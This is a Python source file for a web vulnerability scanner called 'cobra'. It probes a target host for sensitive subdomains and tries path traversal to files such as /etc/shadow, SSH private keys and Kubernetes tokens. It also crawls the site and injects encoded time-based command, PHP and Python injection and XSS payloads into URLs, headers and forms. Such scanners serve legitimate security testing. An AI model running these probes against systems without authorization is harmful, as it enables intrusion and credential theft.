import re
import time
import urllib.parse
from TheSilent.clear import clear
from TheSilent.kitten_crawler import kitten_crawler
from TheSilent.puppy_requests import text

CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RED = "\033[1;31m"

def cobra(host,delay=0,crawl=1):
    clear()
    
    hits = []

    mal_command = [r"sleep 30"]

    mal_directory = [r"c:\windows\system32\eula.txt",
                     r"c:\windows\system32\license.rtf",
                     r".git",
                     r".gitignore",
                     r"application/index/controller/Service.php",
                     r"application/plugins/controller/Upload.php",
                     r"application/websocket/controller/Setting.php",
                     r"apply/index.php",
                     r"etc/group",
                     r"etc/hosts",
                     r"etc/issue",
                     r"etc/motd",
                     r"etc/mysql/my.cnf",
                     r"etc/passwd",
                     r"etc/shadow",
                     r"etc/sudoers",
                     r"filedir",
                     r"home/$USER/.bash_history",
                     r"home/$USER/.ssh/id_rsa",
                     r"include/file.php",
                     r"proc/cmdline",
                     r"proc/mounts",
                     r"proc/net/arp",
                     r"proc/net/route",
                     r"proc/net/tcp",
                     r"proc/net/udp",
                     r"proc/self/cwd/index.php",
                     r"proc/self/cwd/main.py",
                     r"proc/version",
                     r"run/secrets/kubernetes.io/serviceaccount/certificate",
                     r"run/secrets/kubernetes.io/serviceaccount/namespace",
                     r"run/secrets/kubernetes.io/serviceaccount/token",
                     r"usr/local/apache/log/error_log",
                     r"usr/local/apache2/log/error_log",
                     r"var/lib/mlocate.db",
                     r"var/lib/mlocate/mlocate.db",
                     r"var/lib/plocate/plocate.db",
                     r"var/log/apache/access.log",
                     r"var/log/apache/error.log",
                     r"var/log/httpd/error_log",
                     r"var/log/mail",
                     r"var/log/nginx/access.log",
                     r"var/log/nginx/error.log",
                     r"var/log/sshd.log",
                     r"var/log/vsftpd.log",
                     r"var/run/secrets/kubernetes.io/serviceaccount"]

    mal_emoji = ["\U0001F47C",
                 "\U0001F525",
                 "\U0001F638",
                 "\U0001F431",
                 "\U0001F346"]

    mal_forms = ["/admin",
                 "/login",
                 "/portal",
                 "/signup"]

    mal_php = [r"sleep(30)",
               r"sleep(30);"]

    mal_python = [r"time.sleep(30)",
                  r"eval(compile('import time\ntime.sleep(30)','cobra','exec'))",
                  r"eval(compile('import os\nos.system('sleep 30')','cobra','exec'))",
                  r"__import__('time').sleep(30)",
                  r"__import__('os').system('sleep 30')",
                  r'eval("__import__(\'time\').sleep(30)")',
                  r'eval("__import__(\'os\').system(\'sleep 30\')")',
                  r'exec("__import__(\'time\').sleep(30)")',
                  r'exec("__import__(\'os\').system(\'sleep 30\')")',
                  r'exec("import time\ntime.sleep(30)")',
                  r'exec("import os\nos.system(\'sleep 30\')")']
    
    mal_subdomain = ["ad",
                     "admin",
                     "byod",
                     "camera",
                     "cameras",
                     "cctv",
                     "classified",
                     "dev",
                     "extranet",
                     "git",
                     "hr",
                     "internal",
                     "intranet",
                     "it",
                     "lan",
                     "ldap",
                     "local",
                     "private",
                     "secret",
                     "secrets",
                     "test",
                     "wan"]
    
    mal_xss = [r"<iframe>Cobra</iframe>",
               r"<p>cobra</p>",
               r"<script>alert('Cobra')</script>",
               r"<script>await sleep(30);</script>",
               r"<script>prompt('Cobra')</script>",
               r"<strong>cobra</strong>",
               r"<style>body{background-color:red;}</style>",
               r"<title>cobra</title>"]

    # obfuscate command injection
    new_mal_command = []
    for mal in mal_command:
        new_mal_command.append(urllib.parse.quote(mal))
        new_mal_command.append(urllib.parse.quote(urllib.parse.quote(mal)))
        new_mal_command.append(urllib.parse.quote(urllib.parse.quote(mal)))
        new_mal_command.append(urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(mal))))
        new_mal_command.append(f"./{mal}")
        new_mal_command.append(f"../{mal}")
        new_mal_command.append(f"..;/{mal}")
        new_mal_command.append(f"/.{mal}")
        new_mal_command.append(f"/..{mal}")

    for mal in new_mal_command:
        mal_command.append(mal)

    mal_command = list(set(mal_command[:]))

    # obfuscate directory traversal
    new_mal_directory = []
    for mal in mal_directory:
        new_mal_directory.append(urllib.parse.quote(mal))
        new_mal_directory.append(urllib.parse.quote(urllib.parse.quote(mal)))
        new_mal_directory.append(urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(mal))))
        new_mal_directory.append(f"./{mal}")
        new_mal_directory.append(f"../{mal}")
        new_mal_directory.append(f"..;/{mal}")
        new_mal_directory.append(f"/.{mal}")
        new_mal_directory.append(f"/..{mal}")

    for mal in new_mal_directory:
        mal_directory.append(mal)

    mal_directory = list(set(mal_directory[:]))

    # obfuscate php injection
    new_mal_php = []
    for mal in mal_php:
        new_mal_php.append(urllib.parse.quote(mal))
        new_mal_php.append(urllib.parse.quote(urllib.parse.quote(mal)))
        new_mal_php.append(urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(mal))))
        new_mal_php.append(f"./{mal}")
        new_mal_php.append(f"../{mal}")
        new_mal_php.append(f"..;/{mal}")
        new_mal_php.append(f"/.{mal}")
        new_mal_php.append(f"/..{mal}")

    for mal in new_mal_php:
        mal_php.append(mal)

    mal_php = list(set(mal_php[:]))

    # obfuscate python injection
    new_mal_python = []
    for mal in mal_python:
        new_mal_python.append(urllib.parse.quote(mal))
        new_mal_python.append(urllib.parse.quote(urllib.parse.quote(mal)))
        new_mal_python.append(urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(mal))))
        new_mal_python.append(f"./{mal}")
        new_mal_python.append(f"../{mal}")
        new_mal_python.append(f"..;/{mal}")
        new_mal_python.append(f"/.{mal}")
        new_mal_python.append(f"/..{mal}")

    for mal in new_mal_python:
        mal_python.append(mal)

    mal_python = list(set(mal_python[:]))

    # obfuscate xss
    new_mal_xss = []
    for mal in mal_xss:
        new_mal_xss.append(urllib.parse.quote(mal))
        new_mal_xss.append(urllib.parse.quote(urllib.parse.quote(mal)))
        new_mal_xss.append(urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(mal))))
        new_mal_xss.append(f"./{mal}")
        new_mal_xss.append(f"../{mal}")
        new_mal_xss.append(f"..;/{mal}")
        new_mal_xss.append(f"/.{mal}")
        new_mal_xss.append(f"/..{mal}")

    for mal in new_mal_xss:
        mal_xss.append(mal)

    mal_xss = list(set(mal_xss[:]))

    # check for sensitive subdomains
    print(CYAN + f"checking for sensitive subdomains on {host}")
    for mal in mal_subdomain:
        time.sleep(delay)
        try:
            print(f"checking: http://" + mal + "." + ".".join(urllib.parse.urlparse(host).netloc.split('.')[-2:]))
            text("http://" + mal + "." + ".".join(urllib.parse.urlparse(host).netloc.split('.')[-2:]))
            hits.append("found sensitive subdomain: http://" + mal + "." + ".".join(urllib.parse.urlparse(host).netloc.split('.')[-2:]))

        except:
            pass

    # check for directory traversal
    try:
        text(host.rstrip("/") + "/cobra-fuzzer")
        false_positive = True

    except:
        false_positive = False

    if not false_positive:
        for mal in mal_directory:
            time.sleep(delay)
            try:
                print(CYAN + "checking: " + host.rstrip("/") + "/" + mal)
                text(host.rstrip("/") + "/" + mal)
                hits.append("found sensitive directory: " + host.rstrip("/") + "/" + mal)

            except:
                pass

    print(CYAN + f"crawling: {host}")
    hosts = kitten_crawler(host,delay,crawl)

    if not false_positive:
        for mal in mal_forms:
            time.sleep(delay)
            try:
                print(CYAN + "checking: " + host.rstrip("/") + mal)
                text(host.rstrip("/") + mal)
                hosts.append(host.rstrip("/") + mal)

            except:
                pass
    

    hosts = list(dict.fromkeys(hosts[:]))
    clear()
    for _ in hosts:
        if urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(_).netloc:
            print(CYAN + f"checking: {_}")
            try:
                forms = re.findall("<form.+form>",text(_).replace("\n",""))

            except:
                forms = []

            # check for command injection
            for mal in mal_command:
                print(CYAN + f"checking {_} with payload {mal}")
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout = 120)
                    end = time.time()
                    if end - start >= 25:
                        hits.append(f"command injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout = 120)
                    end = time.time()
                    if end - start >= 25:
                        hits.append(f"command injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout = 120)
                    end = time.time()
                    if end - start >= 25:
                        hits.append(f"command injection in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict,timeout=120)
                                    end = time.time()
                                    if end - start >= 25:
                                        hits.append(f"command injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict,timeout=120)
                                    end = time.time()
                                    if end - start >= 25:
                                        hits.append(f"command injection in forms: {_} | {field_dict}")

                    except:
                        pass

            # check for emoji injection- unicode WAF bypass
            for mal in mal_emoji:
                print(CYAN + f"checking {_} with payload {mal}")
                try:
                    time.sleep(delay)
                    data = text(_ + "/" + mal)
                    if mal in data:
                        hits.append(f"emoji injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    data = text(_, headers = {"Cookie",mal})
                    if mal in data:
                        hits.append(f"emoji injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    data = text(_, headers = {"Referer",mal})
                    if mal in data:
                        hits.append(f"emoji injection in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action:
                                    data = text(action,method=method_field,data=field_dict)
                                    if mal in data:
                                        hits.append(f"emoji injection in forms: {action} | {field_dict}")

                                else:
                                    data = text(action,method=method_field,data=field_dict)
                                    if mal in data:
                                        hits.append(f"emoji injection in forms: {_} | {field_dict}")

                    except:
                        pass

            # check for php injection
            for mal in mal_php:
                print(CYAN + f"checking {_} with payload {mal}")
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout = 120)
                    end = time.time()
                    if end - start >= 25:
                        hits.append(f"php injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout = 120)
                    end = time.time()
                    if end - start >= 25:
                        hits.append(f"php injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout = 120)
                    end = time.time()
                    if end - start >= 25:
                        hits.append(f"php injection in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict,timeout=120)
                                    end = time.time()
                                    if end - start >= 25:
                                        hits.append(f"php injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict,timeout=120)
                                    end = time.time()
                                    if end - start >= 25:
                                        hits.append(f"php injection in forms: {_} | {field_dict}")

                    except:
                        pass

            # check for python injection
            for mal in mal_python:
                print(CYAN + f"checking {_} with payload {mal}")
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout = 120)
                    end = time.time()
                    if end - start >= 25:
                        hits.append(f"python injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout = 120)
                    end = time.time()
                    if end - start >= 25:
                        hits.append(f"python injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout = 120)
                    end = time.time()
                    if end - start >= 25:
                        hits.append(f"python injection in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict,timeout=120)
                                    end = time.time()
                                    if end - start >= 25:
                                        hits.append(f"python injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict,timeout=120)
                                    end = time.time()
                                    if end - start >= 25:
                                        hits.append(f"python injection in forms: {_} | {field_dict}")

                    except:
                        pass

            # check for xss
            for mal in mal_xss:
                print(CYAN + f"checking {_} with payload {mal}")
                try:
                    time.sleep(delay)
                    data = text(_ + "/" + mal)
                    if mal in data:
                        hits.append(f"xss in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    data = text(_, headers = {"Cookie",mal})
                    if mal in data:
                        hits.append(f"xss in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    data = text(_, headers = {"Referer",mal})
                    if mal in data:
                        hits.append(f"xss in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action:
                                    data = text(action,method=method_field,data=field_dict)
                                    if mal in data:
                                        hits.append(f"xss in forms: {action} | {field_dict}")

                                else:
                                    data = text(action,method=method_field,data=field_dict)
                                    if mal in data:
                                        hits.append(f"xss in forms: {_} | {field_dict}")

                    except:
                        pass

    clear()
    hits = list(set(hits[:]))
    hits.sort()

    if len(hits) > 0:
        for hit in hits:
            print(RED + hit)
            with open("cobra.log", "a") as file:
                file.write(hit + "\n")

    else:
        print(GREEN + f"we didn't find anything interesting on {host}")
        with open("cobra.log", "a") as file:
                file.write(f"we didn't find anything interesting on {host}\n")
